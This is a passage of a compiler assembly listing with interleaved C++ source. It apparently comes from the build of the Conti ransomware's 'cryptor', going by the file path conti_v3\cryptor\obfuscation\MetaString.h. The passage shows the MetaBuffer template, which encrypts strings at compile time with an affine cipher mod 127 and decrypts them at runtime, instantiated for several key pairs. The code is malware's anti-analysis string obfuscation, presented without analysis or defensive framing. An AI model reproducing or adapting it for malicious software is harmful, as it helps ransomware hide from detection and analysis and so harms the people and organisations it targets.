  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0c	 cmp	 QWORD PTR i$1[rbp], 12
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv182 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0022d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00231	88 85 c0 00 00
	00		 mov	 BYTE PTR tv182[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00237	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0023e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00245	5f		 pop	 rdi
  00246	5d		 pop	 rbp
  00247	c3		 ret	 0
??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<17,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 0c	 sub	 eax, 12
  0002d	6b c0 d4	 imul	 eax, eax, -44		; ffffffffffffffd4H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 65	 imul	 eax, eax, 101		; 00000065H
  0002d	83 c0 0c	 add	 eax, 12
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<101,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

